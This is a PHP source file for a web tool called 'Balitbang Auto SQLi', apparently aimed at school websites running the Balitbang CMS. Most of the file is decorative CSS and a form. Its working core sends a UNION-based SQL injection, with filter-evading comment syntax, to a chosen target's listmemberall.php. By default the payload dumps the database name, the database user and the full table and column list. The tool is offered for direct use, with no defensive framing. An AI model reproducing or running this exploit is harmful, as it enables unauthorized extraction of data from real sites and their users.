
<?php
echo "
<title>Balitbang Auto SQLi</title>
<link href='https://fonts.googleapis.com/css?family=Frijole|Special+Elite|Oswald|Metal Mania|Ceviche+One|Nosifer|Iceberg|Rancho|Iceland|Nova+Mono|Libre+Barcode+39+Extended+Text' rel='stylesheet' type='text/css'> 
         
<style>
body {
         background-color:black;
         background-image: url(http://wallpoper.com/images/00/26/31/65/green-grunge_00263165.jpg);
         font-family: 'Iceberg', Courier, monospace; 
         margin: 450px auto;
         color: white;
         font-size: 25px;
         }
         
         /*sass variables used*/
         /*site container*/
         .wrapper {
         width: 420px;
         margin: 0 auto;
         }
         
         a {
          color: white;
          text-decoration: none;
          font-size: 30px;
          font-family: Metal Mania;
          }
         
         p {
         font: 13px 'Special Elite', Courier, monospace;
         color: red;
         text-shadow: #000 0px 1px 5px;
         margin-bottom: 30px;
         }
         
         .form {
         width: 100%;
         }
         
input[type='submit'] {
        width: 50%;
        padding: 10px;
        border-radius: 5px;
        outline: none;
        background-color: red;
        font: 14px Special Elite;
        color: #FFFFFF;
        text-transform: uppercase;
        border: 1px solid #FFFFFF;
        }
        
        input:focus {
        box-shadow: inset 4px 6px 10px -4px rgba(0, 0, 0, 0.7), 0 1px 1px -1px rgba(255, 255, 255, 0.3);
        background: white;
        -webkit-transition: 1s ease;
        -moz-transition: 1s ease;
        -o-transition: 1s ease;
        -ms-transition: 1s ease;
        transition: 1s ease;
        }
        
        input[type='submit']:hover {
        opacity: 1;
        cursor: pointer;
        }
        input[type='text'], input[type='password'], input[type='file'] {
        width: 98%;
        font-family: 'Iceberg', Courier, monospace; 
        padding: 15px 0px 15px 8px;
        border-radius: 100px;
        background-color: #F8F8F8;
        outline: none;
        border: none;
        border: 1px solid red;
        margin-bottom: 10px;
        color: black;
        }
        
        textarea {
        width: 100%;
        padding: 15px 0px 15px 8px;
        font-family: 'Iceberg', Courier, monospace; 
        border-radius: 10px;
        background: #F1F1F1;
        outline: none;
        border: none;
        border: 2px solid red;
        margin-bottom: 10px;
        color: #000000;
        resize: none;
        }
        .menu {
    background: black;
    text-align: center;
    border: 1px solid red;
    border-radius: 10px;
    color: #ff0000;
    padding: 30px;
    margin: 5px;
}
x {
	text-align:center;
    display: inline;
    border: 1px solid red;
    border-radius: 10px;
    margin: 100px;
    padding: 2px;
    background: repeat-x center bottom #470001;
    color: #FFFFFF;
}
        </style>
        <div class='wrapper'>
        <center>
<body>
<div class='menu'>
<a>Balitbang Auto Sqli</a>
<br>
<form action='' method='POST'>
Target : <br><input type='text' name='target' placeholder='target.sch.id'>
Path : <br><input type='text' name='path' placeholder='member or users'>
<textarea cols='50' rows='10' name='sqli'>concat(0x3c2f613e,database(),0x3c62723e,user(),(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)))</textarea>
Note : Use Http / Https;
</div>
<input type='submit' name='inject' value='Inject'>
</form></center><hr size='1'>";
if(isset($_POST['inject'])){
$target=$_POST['target'];
$path=$_POST['path'];
$sqli=$_POST['sqli'];
echo "<font size='3'>Url : $target<br>Command : $sqli<br><br> Output : ";
$ch = curl_init();curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_URL, "$target/$path/listmemberall.php");curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, "queryString=hantu%'AnD%20point(29,9)%20/*!50000UnION+*/%20/*!50000SelEcT+*/$sqli,version()-- -");curl_setopt($ch, CURLOPT_TIMEOUT, 3);curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 3);curl_setopt($ch, CURLOPT_LOW_SPEED_TIME, 3);curl_setopt($ch, CURLOPT_VERBOSE, true);$buf = curl_exec ($ch);curl_close($ch);
unset($ch);
sleep(1);
echo "$buf";
}
?>